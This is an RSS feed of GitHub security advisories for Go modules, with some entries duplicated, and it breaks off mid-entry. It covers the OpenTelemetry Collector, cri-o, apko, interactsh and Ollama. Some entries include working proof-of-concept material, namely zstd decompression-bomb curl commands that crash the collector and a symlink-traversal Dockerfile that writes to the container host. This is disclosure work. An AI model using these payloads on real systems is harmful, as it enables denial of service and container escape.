<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-06-06T03:01:13.094Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/projectdiscovery/interactsh] Files or Directories Accessible to External Parties in ProjectDiscovery]]></title>
        <id>https://github.com/advisories/GHSA-q5mg-pc7r-r8cr</id>
        <link href="https://github.com/advisories/GHSA-q5mg-pc7r-r8cr"/>
        <updated>2024-06-05T17:06:30.000Z</updated>
        <content type="html"><![CDATA[<p>Files or Directories Accessible to External Parties vulnerability in smb server in ProjectDiscovery Interactsh allows remote attackers to read/write any files in the directory and subdirectories of where the victim runs interactsh-server via anonymous login.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5262">https://nvd.nist.gov/vuln/detail/CVE-2024-5262</a></li>
<li><a href="https://github.com/projectdiscovery/interactsh/pull/874">https://github.com/projectdiscovery/interactsh/pull/874</a></li>
<li><a href="https://zuso.ai/advisory/za-2024-01">https://zuso.ai/advisory/za-2024-01</a></li>
<li><a href="https://github.com/projectdiscovery/interactsh/commit/6a0cb98b16636a98712729f3d23e34d8bf7260e7">https://github.com/projectdiscovery/interactsh/commit/6a0cb98b16636a98712729f3d23e34d8bf7260e7</a></li>
<li><a href="https://github.com/advisories/GHSA-q5mg-pc7r-r8cr">https://github.com/advisories/GHSA-q5mg-pc7r-r8cr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q5mg-pc7r-r8cr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-05T06:30:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.opentelemetry.io/collector/config/configgrpc] Denial of Service via Zip/Decompression Bomb sent over HTTP or gRPC]]></title>
        <id>https://github.com/advisories/GHSA-c74f-6mfw-mm4v</id>
        <link href="https://github.com/advisories/GHSA-c74f-6mfw-mm4v"/>
        <updated>2024-06-05T20:27:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unsafe decompression vulnerability allows unauthenticated attackers to crash the collector via excessive memory consumption.</p>
<h3 id="details">Details</h3>
<p>The OpenTelemetry Collector handles compressed HTTP requests by recognizing the Content-Encoding header, rewriting the HTTP request body, and allowing subsequent handlers to process decompressed data. It supports the gzip, zstd, zlib, snappy, and deflate compression algorithms. A "zip bomb" or "decompression bomb" is a malicious archive designed to crash or disable the system reading it. Decompression of HTTP requests is typically not enabled by default in popular server solutions due to associated security risks. A malicious attacker could leverage this weakness to crash the collector by sending a small request that, when uncompressed by the server, results in excessive memory consumption.</p>
<p>During proof-of-concept (PoC) testing, all supported compression algorithms could be abused, with zstd causing the most significant impact. Compressing 10GB of all-zero data reduced it to 329KB. Sending an HTTP request with this compressed data instantly consumed all available server memory (the testing server had 32GB), leading to an out-of-memory (OOM) kill of the collector application instance.</p>
<p>The root cause for this issue can be found in the following code path:</p>
<p><strong>Affected File:</strong>
<a href="https://github.com/open-telemetry/opentelemetry-collector/blob/062d0a7ffcd45831f993d21d1c6fb67d3e74b5e2/config/confighttp/compression.go">https://github.com/open-telemetry/opentelemetry-collector/[...]confighttp/compression.go</a> </p>
<p><strong>Affected Code:</strong></p>
<pre><code>// httpContentDecompressor offloads the task of handling compressed HTTP requests
// by identifying the compression format in the "Content-Encoding" header and re-writing
// request body so that the handlers further in the chain can work on decompressed data.
// It supports gzip and deflate/zlib compression.
func httpContentDecompressor(h http.Handler, eh func(w http.ResponseWriter, r *http.Request, errorMsg string, statusCode int), decoders map[string]func(body io.ReadCloser) (io.ReadCloser, error)) http.Handler {
    [...]
    d := &amp;decompressor{
        errHandler: errHandler,
        base:   	h,
        decoders: map[string]func(body io.ReadCloser) (io.ReadCloser, error){
            "": func(io.ReadCloser) (io.ReadCloser, error) {
                // Not a compressed payload. Nothing to do.
                return nil, nil
            },
            [...]
            "zstd": func(body io.ReadCloser) (io.ReadCloser, error) {
                zr, err := zstd.NewReader(
                    body,
                    zstd.WithDecoderConcurrency(1),
                )
                if err != nil {
                    return nil, err
                }
                return zr.IOReadCloser(), nil
            },
    [...]
}

func (d *decompressor) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    newBody, err := d.newBodyReader(r)
    if err != nil {
        d.errHandler(w, r, err.Error(), http.StatusBadRequest)
        return
    }
    [...]
    d.base.ServeHTTP(w, r)
}

func (d *decompressor) newBodyReader(r *http.Request) (io.ReadCloser, error) {
    encoding := r.Header.Get(headerContentEncoding)
    decoder, ok := d.decoders[encoding]
    if !ok {
        return nil, fmt.Errorf("unsupported %s: %s", headerContentEncoding, encoding)
    }
    return decoder(r.Body)
}
</code></pre>
<p>To mitigate this attack vector, it is recommended to either disable support for decompressing client HTTP requests entirely or limit the size of the decompressed data that can be processed. Limiting the decompressed data size can be achieved by wrapping the decompressed data reader inside an io.LimitedReader, which restricts the reading to a specified number of bytes. This approach helps prevent excessive memory usage and potential out-of-memory errors caused by decompression bombs.</p>
<h3 id="poc">PoC</h3>
<p>This issue was confirmed as follows:</p>
<p><strong>PoC Commands:</strong></p>
<pre><code>dd if=/dev/zero bs=1G count=10 | zstd &gt; poc.zst
curl -vv "http://192.168.0.107:4318/v1/traces" -H "Content-Type: application/x-protobuf" -H "Content-Encoding: zstd" --data-binary @poc.zst
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>10+0 records in
10+0 records out
10737418240 bytes (11 GB, 10 GiB) copied, 12,207 s, 880 MB/s

* processing: http://192.168.0.107:4318/v1/traces
*   Trying 192.168.0.107:4318...
* Connected to 192.168.0.107 (192.168.0.107) port 4318
&gt; POST /v1/traces HTTP/1.1
&gt; Host: 192.168.0.107:4318
&gt; User-Agent: curl/8.2.1
&gt; Accept: */*
&gt; Content-Type: application/x-protobuf
&gt; Content-Encoding: zstd
&gt; Content-Length: 336655
&gt;
* We are completely uploaded and fine
* Recv failure: Connection reset by peer
* Closing connection
curl: (56) Recv failure: Connection reset by peer
</code></pre>
<p><strong>Server logs:</strong></p>
<pre><code>otel-collector-1  | 2024-05-30T18:36:14.376Z    info    service@v0.101.0/service.go:102    Setting up own telemetry...
[...]
otel-collector-1  | 2024-05-30T18:36:14.385Z    info    otlpreceiver@v0.101.0/otlp.go:152    Starting HTTP server    {"kind": "receiver", "name": "otlp", "data_type": "traces", "endpoint": "0.0.0.0:4318"}
otel-collector-1  | 2024-05-30T18:36:14.385Z    info    service@v0.101.0/service.go:195    Everything is ready. Begin running and processing data.
otel-collector-1  | 2024-05-30T18:36:14.385Z    warn    localhostgate/featuregate.go:63    The default endpoints for all servers in components will change to use localhost instead of 0.0.0.0 in a future version. Use the feature gate to preview the new default.    {"feature gate ID": "component.UseLocalHostAsDefaultHost"}
otel-collector-1 exited with code 137
</code></pre>
<p>A similar problem exists for configgrpc when using the zstd compression:</p>
<pre><code>dd if=/dev/zero bs=1G count=10 | zstd &gt; poc.zst
python3 -c 'import os, struct; f = open("/tmp/body.raw", "w+b"); f.write(b"\x01"); f.write(struct.pack("&gt;L", os.path.getsize("poc.zst"))); f.write(open("poc.zst", "rb").read())'
curl -vv http://127.0.0.1:4317/opentelemetry.proto.collector.trace.v1.TraceService/Export --http2-prior-knowledge -H "content-type: application/grpc" -H "grpc-encoding: zstd" --data-binary @/tmp/body.raw
</code></pre>
<h3 id="impact">Impact</h3>
<p>Unauthenticated attackers can crash the collector via excessive memory consumption, stopping the entire collection of telemetry.</p>
<h3 id="patches">Patches</h3>
<ul>
<li>The confighttp module version 0.102.0 contains a fix for this problem.</li>
<li>The configgrpc module version 0.102.1 contains a fix for this problem.</li>
<li>All official OTel Collector distributions starting with v0.102.1 contain both fixes.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>None.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector/pull/10289">https://github.com/open-telemetry/opentelemetry-collector/pull/10289</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector/pull/10323">https://github.com/open-telemetry/opentelemetry-collector/pull/10323</a></li>
<li><a href="https://opentelemetry.io/blog/2024/cve-2024-36129/">https://opentelemetry.io/blog/2024/cve-2024-36129/</a></li>
</ul>
<h3 id="credits">Credits</h3>
<p>This issue was uncovered during a security audit performed by 7ASecurity, facilitated by OSTIF, for the OpenTelemetry project.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector/security/advisories/GHSA-c74f-6mfw-mm4v">https://github.com/open-telemetry/opentelemetry-collector/security/advisories/GHSA-c74f-6mfw-mm4v</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector/pull/10289">https://github.com/open-telemetry/opentelemetry-collector/pull/10289</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector/pull/10323">https://github.com/open-telemetry/opentelemetry-collector/pull/10323</a></li>
<li><a href="https://opentelemetry.io/blog/2024/cve-2024-36129">https://opentelemetry.io/blog/2024/cve-2024-36129</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36129">https://nvd.nist.gov/vuln/detail/CVE-2024-36129</a></li>
<li><a href="https://github.com/advisories/GHSA-c74f-6mfw-mm4v">https://github.com/advisories/GHSA-c74f-6mfw-mm4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c74f-6mfw-mm4v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-05T16:56:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.opentelemetry.io/collector/config/confighttp] Denial of Service via Zip/Decompression Bomb sent over HTTP or gRPC]]></title>
        <id>https://github.com/advisories/GHSA-c74f-6mfw-mm4v</id>
        <link href="https://github.com/advisories/GHSA-c74f-6mfw-mm4v"/>
        <updated>2024-06-05T20:27:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unsafe decompression vulnerability allows unauthenticated attackers to crash the collector via excessive memory consumption.</p>
<h3 id="details">Details</h3>
<p>The OpenTelemetry Collector handles compressed HTTP requests by recognizing the Content-Encoding header, rewriting the HTTP request body, and allowing subsequent handlers to process decompressed data. It supports the gzip, zstd, zlib, snappy, and deflate compression algorithms. A "zip bomb" or "decompression bomb" is a malicious archive designed to crash or disable the system reading it. Decompression of HTTP requests is typically not enabled by default in popular server solutions due to associated security risks. A malicious attacker could leverage this weakness to crash the collector by sending a small request that, when uncompressed by the server, results in excessive memory consumption.</p>
<p>During proof-of-concept (PoC) testing, all supported compression algorithms could be abused, with zstd causing the most significant impact. Compressing 10GB of all-zero data reduced it to 329KB. Sending an HTTP request with this compressed data instantly consumed all available server memory (the testing server had 32GB), leading to an out-of-memory (OOM) kill of the collector application instance.</p>
<p>The root cause for this issue can be found in the following code path:</p>
<p><strong>Affected File:</strong>
<a href="https://github.com/open-telemetry/opentelemetry-collector/blob/062d0a7ffcd45831f993d21d1c6fb67d3e74b5e2/config/confighttp/compression.go">https://github.com/open-telemetry/opentelemetry-collector/[...]confighttp/compression.go</a> </p>
<p><strong>Affected Code:</strong></p>
<pre><code>// httpContentDecompressor offloads the task of handling compressed HTTP requests
// by identifying the compression format in the "Content-Encoding" header and re-writing
// request body so that the handlers further in the chain can work on decompressed data.
// It supports gzip and deflate/zlib compression.
func httpContentDecompressor(h http.Handler, eh func(w http.ResponseWriter, r *http.Request, errorMsg string, statusCode int), decoders map[string]func(body io.ReadCloser) (io.ReadCloser, error)) http.Handler {
    [...]
    d := &amp;decompressor{
        errHandler: errHandler,
        base:   	h,
        decoders: map[string]func(body io.ReadCloser) (io.ReadCloser, error){
            "": func(io.ReadCloser) (io.ReadCloser, error) {
                // Not a compressed payload. Nothing to do.
                return nil, nil
            },
            [...]
            "zstd": func(body io.ReadCloser) (io.ReadCloser, error) {
                zr, err := zstd.NewReader(
                    body,
                    zstd.WithDecoderConcurrency(1),
                )
                if err != nil {
                    return nil, err
                }
                return zr.IOReadCloser(), nil
            },
    [...]
}

func (d *decompressor) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    newBody, err := d.newBodyReader(r)
    if err != nil {
        d.errHandler(w, r, err.Error(), http.StatusBadRequest)
        return
    }
    [...]
    d.base.ServeHTTP(w, r)
}

func (d *decompressor) newBodyReader(r *http.Request) (io.ReadCloser, error) {
    encoding := r.Header.Get(headerContentEncoding)
    decoder, ok := d.decoders[encoding]
    if !ok {
        return nil, fmt.Errorf("unsupported %s: %s", headerContentEncoding, encoding)
    }
    return decoder(r.Body)
}
</code></pre>
<p>To mitigate this attack vector, it is recommended to either disable support for decompressing client HTTP requests entirely or limit the size of the decompressed data that can be processed. Limiting the decompressed data size can be achieved by wrapping the decompressed data reader inside an io.LimitedReader, which restricts the reading to a specified number of bytes. This approach helps prevent excessive memory usage and potential out-of-memory errors caused by decompression bombs.</p>
<h3 id="poc">PoC</h3>
<p>This issue was confirmed as follows:</p>
<p><strong>PoC Commands:</strong></p>
<pre><code>dd if=/dev/zero bs=1G count=10 | zstd &gt; poc.zst
curl -vv "http://192.168.0.107:4318/v1/traces" -H "Content-Type: application/x-protobuf" -H "Content-Encoding: zstd" --data-binary @poc.zst
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>10+0 records in
10+0 records out
10737418240 bytes (11 GB, 10 GiB) copied, 12,207 s, 880 MB/s

* processing: http://192.168.0.107:4318/v1/traces
*   Trying 192.168.0.107:4318...
* Connected to 192.168.0.107 (192.168.0.107) port 4318
&gt; POST /v1/traces HTTP/1.1
&gt; Host: 192.168.0.107:4318
&gt; User-Agent: curl/8.2.1
&gt; Accept: */*
&gt; Content-Type: application/x-protobuf
&gt; Content-Encoding: zstd
&gt; Content-Length: 336655
&gt;
* We are completely uploaded and fine
* Recv failure: Connection reset by peer
* Closing connection
curl: (56) Recv failure: Connection reset by peer
</code></pre>
<p><strong>Server logs:</strong></p>
<pre><code>otel-collector-1  | 2024-05-30T18:36:14.376Z    info    service@v0.101.0/service.go:102    Setting up own telemetry...
[...]
otel-collector-1  | 2024-05-30T18:36:14.385Z    info    otlpreceiver@v0.101.0/otlp.go:152    Starting HTTP server    {"kind": "receiver", "name": "otlp", "data_type": "traces", "endpoint": "0.0.0.0:4318"}
otel-collector-1  | 2024-05-30T18:36:14.385Z    info    service@v0.101.0/service.go:195    Everything is ready. Begin running and processing data.
otel-collector-1  | 2024-05-30T18:36:14.385Z    warn    localhostgate/featuregate.go:63    The default endpoints for all servers in components will change to use localhost instead of 0.0.0.0 in a future version. Use the feature gate to preview the new default.    {"feature gate ID": "component.UseLocalHostAsDefaultHost"}
otel-collector-1 exited with code 137
</code></pre>
<p>A similar problem exists for configgrpc when using the zstd compression:</p>
<pre><code>dd if=/dev/zero bs=1G count=10 | zstd &gt; poc.zst
python3 -c 'import os, struct; f = open("/tmp/body.raw", "w+b"); f.write(b"\x01"); f.write(struct.pack("&gt;L", os.path.getsize("poc.zst"))); f.write(open("poc.zst", "rb").read())'
curl -vv http://127.0.0.1:4317/opentelemetry.proto.collector.trace.v1.TraceService/Export --http2-prior-knowledge -H "content-type: application/grpc" -H "grpc-encoding: zstd" --data-binary @/tmp/body.raw
</code></pre>
<h3 id="impact">Impact</h3>
<p>Unauthenticated attackers can crash the collector via excessive memory consumption, stopping the entire collection of telemetry.</p>
<h3 id="patches">Patches</h3>
<ul>
<li>The confighttp module version 0.102.0 contains a fix for this problem.</li>
<li>The configgrpc module version 0.102.1 contains a fix for this problem.</li>
<li>All official OTel Collector distributions starting with v0.102.1 contain both fixes.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>None.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector/pull/10289">https://github.com/open-telemetry/opentelemetry-collector/pull/10289</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector/pull/10323">https://github.com/open-telemetry/opentelemetry-collector/pull/10323</a></li>
<li><a href="https://opentelemetry.io/blog/2024/cve-2024-36129/">https://opentelemetry.io/blog/2024/cve-2024-36129/</a></li>
</ul>
<h3 id="credits">Credits</h3>
<p>This issue was uncovered during a security audit performed by 7ASecurity, facilitated by OSTIF, for the OpenTelemetry project.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector/security/advisories/GHSA-c74f-6mfw-mm4v">https://github.com/open-telemetry/opentelemetry-collector/security/advisories/GHSA-c74f-6mfw-mm4v</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector/pull/10289">https://github.com/open-telemetry/opentelemetry-collector/pull/10289</a></li>
<li><a href="https://github.com/open-telemetry/opentelemetry-collector/pull/10323">https://github.com/open-telemetry/opentelemetry-collector/pull/10323</a></li>
<li><a href="https://opentelemetry.io/blog/2024/cve-2024-36129">https://opentelemetry.io/blog/2024/cve-2024-36129</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36129">https://nvd.nist.gov/vuln/detail/CVE-2024-36129</a></li>
<li><a href="https://github.com/advisories/GHSA-c74f-6mfw-mm4v">https://github.com/advisories/GHSA-c74f-6mfw-mm4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c74f-6mfw-mm4v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-05T16:56:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cri-o/cri-o] malicious container creates symlink "mtab" on the host External]]></title>
        <id>https://github.com/advisories/GHSA-j9hf-98c3-wrm8</id>
        <link href="https://github.com/advisories/GHSA-j9hf-98c3-wrm8"/>
        <updated>2024-06-04T18:12:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A malicious container can affect the host by taking advantage of code cri-o added to show the container mounts on the host.</p>
<p>A workload built from this Dockerfile:</p>
<pre><code>FROM docker.io/library/busybox as source
RUN mkdir /extra &amp;&amp; cd /extra &amp;&amp; ln -s ../../../../../../../../root etc

FROM scratch

COPY --from=source /bin /bin
COPY --from=source /lib /lib
COPY --from=source /extra .
</code></pre>
<p>and this container config:</p>
<pre><code>{
  "metadata": {
      "name": "busybox"
  },
  "image":{
      "image": "localhost/test"
  },
  "command": [
      "/bin/true"
  ],
  "linux": {
  }
}

</code></pre>
<p>and this sandbox config  </p>
<pre><code>{
  "metadata": {
    "name": "test-sandbox",
    "namespace": "default",
    "attempt": 1,
    "uid": "edishd83djaideaduwk28bcsb"
  },
  "linux": {
    "security_context": {
      "namespace_options": {
        "network": 2
      }
    }
  }
}
</code></pre>
<p>will create a file on host <code>/host/mtab</code></p>
<h3 id="patches">Patches</h3>
<p>1.30.1, 1.29.5, 1.28.7</p>
<h3 id="workarounds">Workarounds</h3>
<p>Unfortunately not</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cri-o/cri-o/security/advisories/GHSA-j9hf-98c3-wrm8">https://github.com/cri-o/cri-o/security/advisories/GHSA-j9hf-98c3-wrm8</a></li>
<li><a href="https://github.com/advisories/GHSA-j9hf-98c3-wrm8">https://github.com/advisories/GHSA-j9hf-98c3-wrm8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j9hf-98c3-wrm8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T18:12:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cri-o/cri-o] malicious container creates symlink "mtab" on the host External]]></title>
        <id>https://github.com/advisories/GHSA-j9hf-98c3-wrm8</id>
        <link href="https://github.com/advisories/GHSA-j9hf-98c3-wrm8"/>
        <updated>2024-06-04T18:12:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A malicious container can affect the host by taking advantage of code cri-o added to show the container mounts on the host.</p>
<p>A workload built from this Dockerfile:</p>
<pre><code>FROM docker.io/library/busybox as source
RUN mkdir /extra &amp;&amp; cd /extra &amp;&amp; ln -s ../../../../../../../../root etc

FROM scratch

COPY --from=source /bin /bin
COPY --from=source /lib /lib
COPY --from=source /extra .
</code></pre>
<p>and this container config:</p>
<pre><code>{
  "metadata": {
      "name": "busybox"
  },
  "image":{
      "image": "localhost/test"
  },
  "command": [
      "/bin/true"
  ],
  "linux": {
  }
}

</code></pre>
<p>and this sandbox config  </p>
<pre><code>{
  "metadata": {
    "name": "test-sandbox",
    "namespace": "default",
    "attempt": 1,
    "uid": "edishd83djaideaduwk28bcsb"
  },
  "linux": {
    "security_context": {
      "namespace_options": {
        "network": 2
      }
    }
  }
}
</code></pre>
<p>will create a file on host <code>/host/mtab</code></p>
<h3 id="patches">Patches</h3>
<p>1.30.1, 1.29.5, 1.28.7</p>
<h3 id="workarounds">Workarounds</h3>
<p>Unfortunately not</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cri-o/cri-o/security/advisories/GHSA-j9hf-98c3-wrm8">https://github.com/cri-o/cri-o/security/advisories/GHSA-j9hf-98c3-wrm8</a></li>
<li><a href="https://github.com/advisories/GHSA-j9hf-98c3-wrm8">https://github.com/advisories/GHSA-j9hf-98c3-wrm8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j9hf-98c3-wrm8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T18:12:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cri-o/cri-o] malicious container creates symlink "mtab" on the host External]]></title>
        <id>https://github.com/advisories/GHSA-j9hf-98c3-wrm8</id>
        <link href="https://github.com/advisories/GHSA-j9hf-98c3-wrm8"/>
        <updated>2024-06-04T18:12:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A malicious container can affect the host by taking advantage of code cri-o added to show the container mounts on the host.</p>
<p>A workload built from this Dockerfile:</p>
<pre><code>FROM docker.io/library/busybox as source
RUN mkdir /extra &amp;&amp; cd /extra &amp;&amp; ln -s ../../../../../../../../root etc

FROM scratch

COPY --from=source /bin /bin
COPY --from=source /lib /lib
COPY --from=source /extra .
</code></pre>
<p>and this container config:</p>
<pre><code>{
  "metadata": {
      "name": "busybox"
  },
  "image":{
      "image": "localhost/test"
  },
  "command": [
      "/bin/true"
  ],
  "linux": {
  }
}

</code></pre>
<p>and this sandbox config  </p>
<pre><code>{
  "metadata": {
    "name": "test-sandbox",
    "namespace": "default",
    "attempt": 1,
    "uid": "edishd83djaideaduwk28bcsb"
  },
  "linux": {
    "security_context": {
      "namespace_options": {
        "network": 2
      }
    }
  }
}
</code></pre>
<p>will create a file on host <code>/host/mtab</code></p>
<h3 id="patches">Patches</h3>
<p>1.30.1, 1.29.5, 1.28.7</p>
<h3 id="workarounds">Workarounds</h3>
<p>Unfortunately not</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cri-o/cri-o/security/advisories/GHSA-j9hf-98c3-wrm8">https://github.com/cri-o/cri-o/security/advisories/GHSA-j9hf-98c3-wrm8</a></li>
<li><a href="https://github.com/advisories/GHSA-j9hf-98c3-wrm8">https://github.com/advisories/GHSA-j9hf-98c3-wrm8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j9hf-98c3-wrm8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T18:12:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[chainguard.dev/apko] apko Exposure of HTTP basic auth credentials in log output]]></title>
        <id>https://github.com/advisories/GHSA-v6mg-7f7p-qmqp</id>
        <link href="https://github.com/advisories/GHSA-v6mg-7f7p-qmqp"/>
        <updated>2024-06-04T17:52:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Exposure of HTTP basic auth credentials from repository and keyring URLs in log output</p>
<h3 id="details">Details</h3>
<p>There was a handful of instances where the <code>apko</code> tool was outputting error messages and log entries where HTTP basic authentication credentials were exposed for one of two reasons:</p>
<ol>
<li>The<code>%s</code> verb was used to format a <code>url.URL</code> as a string, which includes un-redacted HTTP basic authentication credentials if they are included in the URL.</li>
<li>A string URL value (such as from the configuration YAML file supplied used in an apko execution) was never parsed as a URL, so there was no chance of redacting credentials in the logical flow.</li>
</ol>
<p>apko, as well as its companion library <code>go-apk</code>, have been updated to ensure URLs are parsed and redacted before being output as string values.</p>
<h3 id="poc">PoC</h3>
<p>Create a config file like this <code>apko.yaml</code>:</p>
<pre><code class="language-yaml">contents:
  keyring:
    - https://packages.wolfi.dev/os/wolfi-signing.rsa.pub
  repositories:
    - https://me%40example.com:supersecretpassword@localhost:8080/os
  packages:
    - wolfi-base

cmd: /bin/sh -l

archs:
- x86_64
- aarch64
</code></pre>
<p>Then run:</p>
<pre><code class="language-shell">apko build apko.yaml latest foo.tar --log-level debug
</code></pre>
<p>Observe instances of the password being shown verbatim in the log output, such as:</p>
<pre><code class="language-text">...
DEBU image configuration:
contents:
    repositories:
        - https://me%40example.com:supersecretpassword@localhost:8080/os
    keyring:
        - https://packages.wolfi.dev/os/wolfi-signing.rsa.pub
    packages:
        - wolfi-base
...
</code></pre>
<h3 id="impact">Impact</h3>
<p>For users accessing keyring or APK repository content using HTTP basic auth, credentials were being logged in plaintext, depending on the user's logging settings. If you use apko in continuous integration jobs, it is likely that the credentials leak via logs of these jobs. Depending on the accessibility of these logs, this could be a company-internal or public leakage of credentials.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/chainguard-dev/apko/security/advisories/GHSA-v6mg-7f7p-qmqp">https://github.com/chainguard-dev/apko/security/advisories/GHSA-v6mg-7f7p-qmqp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36127">https://nvd.nist.gov/vuln/detail/CVE-2024-36127</a></li>
<li><a href="https://github.com/chainguard-dev/apko/commit/2c0533e4d52e83031a04f6a83ec63fc2a11eff01">https://github.com/chainguard-dev/apko/commit/2c0533e4d52e83031a04f6a83ec63fc2a11eff01</a></li>
<li><a href="https://github.com/advisories/GHSA-v6mg-7f7p-qmqp">https://github.com/advisories/GHSA-v6mg-7f7p-qmqp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v6mg-7f7p-qmqp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T17:52:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/ollama/ollama] Ollama does not validate the format of the digest (sha256 with 64 hex digits)]]></title>
        <id>https://github.com/advisories/GHSA-8hqg-whrw-pv92</id>
        <link href="https://github.com/advisories/GHSA-8hqg-whrw-pv92"/>
        <updated>2024-06-03T13:29:54.000Z</updated>
        <content type="html"><![CDATA[<p>Ollama before 0.1.34 does not validate the format of the digest (sha256 with 64 hex digits) when getting the model path, and thus mishandles the TestGetBlobsPath test cases such as fewer than 64 hex digits, more than 64 hex digits, or an initial <code>../</code> substring.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37032">https://nvd.nist.gov/vuln/detail/CVE-2024-37032</a></li>
<li><a href="https://github.com/ollama/ollama/pull/4175">https://github.com/ollama/ollama/pull/4175</a></li>
<li><a href="https://github.com/ollama/ollama/blob/adeb40eaf29039b8964425f69a9315f9f1694ba8/server/modelpath_test.go#L41-L58">https://github.com/ollama/ollama/blob/adeb40eaf29039b8964425f69a9315f9f1694ba8/server/modelpath_test.go#L41-L58</a></li>
<li><a href="https://github.com/ollama/ollama/compare/v0.1.33...v0.1.34">https://github.com/ollama/ollama/compare/v0.1.33...v0.1.34</a></li>
<li><a href="https://github.com/ollama/ollama/commit/2a21363bb756a7341d3d577f098583865bd7603f">https://github.com/ollama/ollama/commit/2a21363bb756a7341d3d577f098583865bd7603f</a></li>
<li><a href="https://github.com/advisories/GHSA-8hqg-whrw-pv92">https://github.com/advisories/GHSA-8hqg-whrw-pv92</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8hqg-whrw-pv92</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-31T06:30:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/goharbor/harbor] SQL Injection in Harbor scan log API]]></title>
        <id>https://github.com/advisories/GHSA-vw63-824v-qf2j</id>
        <link href="https://github.com/advisories/GHSA-vw63-824v-qf2j"/>
        <updated>2024-06-02T22:32:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
